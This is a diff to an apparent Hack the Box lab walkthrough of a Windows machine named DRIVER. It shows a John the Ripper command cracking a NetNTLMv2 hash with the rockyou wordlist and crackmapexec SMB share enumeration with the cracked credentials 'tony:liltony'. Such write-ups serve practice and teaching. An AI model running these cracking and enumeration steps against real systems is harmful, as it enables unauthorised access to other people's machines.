@@ -150,20 +150,18 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 ntlm.hash
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/593049c4-b06b-4a12-86c8-3a465fe42584)
 
-
-
 SMB Enumeration
 ```CSS
-crackmapexec smb 10.10.11.106 -u '' -p '' --shares
+crackmapexec smb 10.10.11.106 -u 'tony' -p 'liltony' --shares
 
 SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
-SMB         10.10.11.106    445    DRIVER           [-] DRIVER\: STATUS_ACCESS_DENIED 
-SMB         10.10.11.106    445    DRIVER           [-] Error enumerating shares: Error occurs while reading from remote(104)
+SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony 
+SMB         10.10.11.106    445    DRIVER           [+] Enumerated shares
+SMB         10.10.11.106    445    DRIVER           Share           Permissions     Remark
+SMB         10.10.11.106    445    DRIVER           -----           -----------     ------
+SMB         10.10.11.106    445    DRIVER           ADMIN$                          Remote Admin
+SMB         10.10.11.106    445    DRIVER           C$                              Default share
+SMB         10.10.11.106    445    DRIVER           IPC$                            Remote IPC
 ```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/543ce28c-ab6c-4609-a3c2-f5a28fe992b5)
 
-```CSS
-crackmapexec smb 10.10.11.106 -u 'anonymous' -p '' --shares
-
-SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
-SMB         10.10.11.106    445    DRIVER           [-] DRIVER\anonymous: STATUS_LOGON_FAILURE 
-```
